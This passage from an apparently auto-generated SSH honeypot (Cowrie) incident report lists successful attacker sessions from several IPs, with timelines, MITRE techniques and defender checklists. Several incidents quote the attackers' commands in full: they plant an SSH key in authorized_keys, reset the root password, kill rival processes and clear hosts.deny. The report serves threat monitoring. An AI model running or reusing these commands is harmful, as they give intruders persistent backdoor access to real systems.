| `2026-04-08 08:31:08` | `cowrie.login.success` |
| `2026-04-08 08:31:09` | `cowrie.session.params` |
| `2026-04-08 08:31:09` | `cowrie.command.input` |
| `2026-04-08 08:31:09` | `cowrie.command.failed` |
| `2026-04-08 08:31:09` | `cowrie.log.closed` |
| `2026-04-08 08:31:10` | `cowrie.session.params` |
| `2026-04-08 08:31:10` | `cowrie.command.input` |
| `2026-04-08 08:31:10` | `cowrie.session.file_download` |
| `2026-04-08 08:31:10` | `cowrie.log.closed` |
| `2026-04-08 08:31:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e053add496

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:31 |
| **Last Seen** | 2026-04-08 08:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:31:14` | `cowrie.session.connect` |
| `2026-04-08 08:31:14` | `cowrie.client.version` |
| `2026-04-08 08:31:14` | `cowrie.client.kex` |
| `2026-04-08 08:31:16` | `cowrie.login.success` |
| `2026-04-08 08:31:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6b86b09e4ea

| Field | Detail |
|---|---|
| **Source IP** | `115.190.13[.]99` |
| **First Seen** | 2026-04-08 08:32 |
| **Last Seen** | 2026-04-08 08:32 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wQmvwNEuF95N"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:32:08` | `cowrie.session.connect` |
| `2026-04-08 08:32:08` | `cowrie.client.version` |
| `2026-04-08 08:32:08` | `cowrie.client.kex` |
| `2026-04-08 08:32:09` | `cowrie.login.success` |
| `2026-04-08 08:32:09` | `cowrie.session.params` |
| `2026-04-08 08:32:09` | `cowrie.command.input` |
| `2026-04-08 08:32:09` | `cowrie.command.failed` |
| `2026-04-08 08:32:10` | `cowrie.log.closed` |
| `2026-04-08 08:32:10` | `cowrie.session.params` |
| `2026-04-08 08:32:10` | `cowrie.command.input` |
| `2026-04-08 08:32:10` | `cowrie.session.file_download` |
| `2026-04-08 08:32:10` | `cowrie.log.closed` |
| `2026-04-08 08:32:22` | `cowrie.session.params` |
| `2026-04-08 08:32:22` | `cowrie.command.input` |
| `2026-04-08 08:32:22` | `cowrie.log.closed` |
| `2026-04-08 08:32:23` | `cowrie.session.params` |
| `2026-04-08 08:32:23` | `cowrie.command.input` |
| `2026-04-08 08:32:23` | `cowrie.log.closed` |
| `2026-04-08 08:32:24` | `cowrie.session.params` |
| `2026-04-08 08:32:24` | `cowrie.command.input` |
| `2026-04-08 08:32:24` | `cowrie.session.file_download` |
| `2026-04-08 08:32:24` | `cowrie.log.closed` |
| `2026-04-08 08:32:24` | `cowrie.session.params` |
| `2026-04-08 08:32:24` | `cowrie.command.input` |
| `2026-04-08 08:32:24` | `cowrie.log.closed` |
| `2026-04-08 08:32:25` | `cowrie.session.params` |
| `2026-04-08 08:32:25` | `cowrie.command.input` |
| `2026-04-08 08:32:25` | `cowrie.log.closed` |
| `2026-04-08 08:32:26` | `cowrie.session.params` |
| `2026-04-08 08:32:26` | `cowrie.command.input` |
| `2026-04-08 08:32:26` | `cowrie.command.input` |
| `2026-04-08 08:32:26` | `cowrie.log.closed` |
| `2026-04-08 08:32:27` | `cowrie.session.params` |
| `2026-04-08 08:32:27` | `cowrie.command.input` |
| `2026-04-08 08:32:27` | `cowrie.log.closed` |
| `2026-04-08 08:32:27` | `cowrie.session.params` |
| `2026-04-08 08:32:27` | `cowrie.command.input` |
| `2026-04-08 08:32:27` | `cowrie.log.closed` |
| `2026-04-08 08:32:28` | `cowrie.session.params` |
| `2026-04-08 08:32:28` | `cowrie.command.input` |
| `2026-04-08 08:32:28` | `cowrie.log.closed` |
| `2026-04-08 08:32:30` | `cowrie.session.params` |
| `2026-04-08 08:32:30` | `cowrie.command.input` |
| `2026-04-08 08:32:32` | `cowrie.log.closed` |
| `2026-04-08 08:32:32` | `cowrie.session.params` |
| `2026-04-08 08:32:32` | `cowrie.command.input` |
| `2026-04-08 08:32:32` | `cowrie.log.closed` |
| `2026-04-08 08:32:33` | `cowrie.session.params` |
| `2026-04-08 08:32:33` | `cowrie.command.input` |
| `2026-04-08 08:32:33` | `cowrie.log.closed` |
| `2026-04-08 08:32:33` | `cowrie.session.params` |
| `2026-04-08 08:32:33` | `cowrie.command.input` |
| `2026-04-08 08:32:33` | `cowrie.log.closed` |
| `2026-04-08 08:32:34` | `cowrie.session.params` |
| `2026-04-08 08:32:34` | `cowrie.command.input` |
| `2026-04-08 08:32:34` | `cowrie.log.closed` |
| `2026-04-08 08:32:35` | `cowrie.session.params` |
| `2026-04-08 08:32:35` | `cowrie.command.input` |
| `2026-04-08 08:32:35` | `cowrie.log.closed` |
| `2026-04-08 08:32:35` | `cowrie.session.params` |
| `2026-04-08 08:32:35` | `cowrie.command.input` |
| `2026-04-08 08:32:35` | `cowrie.log.closed` |
| `2026-04-08 08:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.13[.]99` to AbuseIPDB if not already reported
- [ ] Block `115.190.13[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d036bbf7d073

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:34 |
| **Last Seen** | 2026-04-08 08:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:34:32` | `cowrie.session.connect` |
| `2026-04-08 08:34:32` | `cowrie.client.version` |
| `2026-04-08 08:34:32` | `cowrie.client.kex` |
| `2026-04-08 08:34:33` | `cowrie.login.success` |
| `2026-04-08 08:34:33` | `cowrie.session.params` |
| `2026-04-08 08:34:33` | `cowrie.command.input` |
| `2026-04-08 08:34:33` | `cowrie.command.failed` |
| `2026-04-08 08:34:34` | `cowrie.log.closed` |
| `2026-04-08 08:34:34` | `cowrie.session.params` |
| `2026-04-08 08:34:34` | `cowrie.command.input` |
| `2026-04-08 08:34:34` | `cowrie.session.file_download` |
| `2026-04-08 08:34:34` | `cowrie.log.closed` |
| `2026-04-08 08:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bd1a64e345b

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:34 |
| **Last Seen** | 2026-04-08 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:34:38` | `cowrie.session.connect` |
| `2026-04-08 08:34:38` | `cowrie.client.version` |
| `2026-04-08 08:34:38` | `cowrie.client.kex` |
| `2026-04-08 08:34:39` | `cowrie.login.success` |
| `2026-04-08 08:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61968af579e1

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:34 |
| **Last Seen** | 2026-04-08 08:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:34:53` | `cowrie.session.connect` |
| `2026-04-08 08:34:53` | `cowrie.client.version` |
| `2026-04-08 08:34:54` | `cowrie.client.kex` |
| `2026-04-08 08:34:55` | `cowrie.login.success` |
| `2026-04-08 08:34:56` | `cowrie.session.params` |
| `2026-04-08 08:34:56` | `cowrie.command.input` |
| `2026-04-08 08:34:56` | `cowrie.command.failed` |
| `2026-04-08 08:34:56` | `cowrie.log.closed` |
| `2026-04-08 08:34:57` | `cowrie.session.params` |
| `2026-04-08 08:34:57` | `cowrie.command.input` |
| `2026-04-08 08:34:57` | `cowrie.session.file_download` |
| `2026-04-08 08:34:57` | `cowrie.log.closed` |
| `2026-04-08 08:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99aa82223e5

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-08 08:35 |
| **Last Seen** | 2026-04-08 08:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:35:01` | `cowrie.session.connect` |
| `2026-04-08 08:35:01` | `cowrie.client.version` |
| `2026-04-08 08:35:01` | `cowrie.client.kex` |
| `2026-04-08 08:35:02` | `cowrie.login.success` |
| `2026-04-08 08:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab094de467ad

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:36 |
| **Last Seen** | 2026-04-08 08:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:36:23` | `cowrie.session.connect` |
| `2026-04-08 08:36:23` | `cowrie.client.version` |
| `2026-04-08 08:36:23` | `cowrie.client.kex` |
| `2026-04-08 08:36:24` | `cowrie.login.success` |
| `2026-04-08 08:36:25` | `cowrie.session.params` |
| `2026-04-08 08:36:25` | `cowrie.command.input` |
| `2026-04-08 08:36:25` | `cowrie.command.failed` |
| `2026-04-08 08:36:25` | `cowrie.log.closed` |
| `2026-04-08 08:36:25` | `cowrie.session.params` |
| `2026-04-08 08:36:25` | `cowrie.command.input` |
| `2026-04-08 08:36:26` | `cowrie.session.file_download` |
| `2026-04-08 08:36:26` | `cowrie.log.closed` |
| `2026-04-08 08:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f91465bcf906

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:36 |
| **Last Seen** | 2026-04-08 08:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:36:28` | `cowrie.session.connect` |
| `2026-04-08 08:36:28` | `cowrie.client.version` |
| `2026-04-08 08:36:28` | `cowrie.client.kex` |
| `2026-04-08 08:36:29` | `cowrie.login.success` |
| `2026-04-08 08:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5b588500c48

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:38 |
| **Last Seen** | 2026-04-08 08:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:38:18` | `cowrie.session.connect` |
| `2026-04-08 08:38:18` | `cowrie.client.version` |
| `2026-04-08 08:38:18` | `cowrie.client.kex` |
| `2026-04-08 08:38:19` | `cowrie.login.success` |
| `2026-04-08 08:38:19` | `cowrie.session.params` |
| `2026-04-08 08:38:19` | `cowrie.command.input` |
| `2026-04-08 08:38:19` | `cowrie.command.failed` |
| `2026-04-08 08:38:20` | `cowrie.log.closed` |
| `2026-04-08 08:38:20` | `cowrie.session.params` |
| `2026-04-08 08:38:20` | `cowrie.command.input` |
| `2026-04-08 08:38:20` | `cowrie.session.file_download` |
| `2026-04-08 08:38:20` | `cowrie.log.closed` |
| `2026-04-08 08:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc376befdbba

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:38 |
| **Last Seen** | 2026-04-08 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:38:26` | `cowrie.session.connect` |
| `2026-04-08 08:38:26` | `cowrie.client.version` |
| `2026-04-08 08:38:26` | `cowrie.client.kex` |
| `2026-04-08 08:38:27` | `cowrie.login.success` |
| `2026-04-08 08:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c07904ed76c

| Field | Detail |
|---|---|
| **Source IP** | `115.190.13[.]99` |
| **First Seen** | 2026-04-08 08:38 |
| **Last Seen** | 2026-04-08 08:39 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:38:55` | `cowrie.session.connect` |
| `2026-04-08 08:38:55` | `cowrie.client.version` |
| `2026-04-08 08:38:56` | `cowrie.client.kex` |
| `2026-04-08 08:38:56` | `cowrie.login.success` |
| `2026-04-08 08:38:57` | `cowrie.session.params` |
| `2026-04-08 08:38:57` | `cowrie.command.input` |
| `2026-04-08 08:38:57` | `cowrie.command.failed` |
| `2026-04-08 08:38:57` | `cowrie.log.closed` |
| `2026-04-08 08:38:58` | `cowrie.session.params` |
| `2026-04-08 08:38:58` | `cowrie.command.input` |
| `2026-04-08 08:38:58` | `cowrie.session.file_download` |
| `2026-04-08 08:38:58` | `cowrie.log.closed` |
| `2026-04-08 08:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.13[.]99` to AbuseIPDB if not already reported
- [ ] Block `115.190.13[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-886343f7cc81

| Field | Detail |
|---|---|
| **Source IP** | `115.190.13[.]99` |
| **First Seen** | 2026-04-08 08:39 |
| **Last Seen** | 2026-04-08 08:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:39:04` | `cowrie.session.connect` |
| `2026-04-08 08:39:04` | `cowrie.client.version` |
| `2026-04-08 08:39:04` | `cowrie.client.kex` |
| `2026-04-08 08:39:08` | `cowrie.login.success` |
| `2026-04-08 08:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.13[.]99` to AbuseIPDB if not already reported
- [ ] Block `115.190.13[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec74237e399d

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:40 |
| **Last Seen** | 2026-04-08 08:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:40:05` | `cowrie.session.connect` |
| `2026-04-08 08:40:05` | `cowrie.client.version` |
| `2026-04-08 08:40:05` | `cowrie.client.kex` |
| `2026-04-08 08:40:06` | `cowrie.login.success` |
| `2026-04-08 08:40:07` | `cowrie.session.params` |
| `2026-04-08 08:40:07` | `cowrie.command.input` |
| `2026-04-08 08:40:07` | `cowrie.command.failed` |
| `2026-04-08 08:40:07` | `cowrie.log.closed` |
| `2026-04-08 08:40:07` | `cowrie.session.params` |
| `2026-04-08 08:40:07` | `cowrie.command.input` |
| `2026-04-08 08:40:08` | `cowrie.session.file_download` |
| `2026-04-08 08:40:08` | `cowrie.log.closed` |
| `2026-04-08 08:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91a378af61d0

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:40 |
| **Last Seen** | 2026-04-08 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:40:10` | `cowrie.session.connect` |
| `2026-04-08 08:40:10` | `cowrie.client.version` |
| `2026-04-08 08:40:10` | `cowrie.client.kex` |
| `2026-04-08 08:40:11` | `cowrie.login.success` |
| `2026-04-08 08:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.181.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `5.181.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e3d21c37d9

| Field | Detail |
|---|---|
| **Source IP** | `5.181.87[.]35` |
| **First Seen** | 2026-04-08 08:41 |
| **Last Seen** | 2026-04-08 08:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
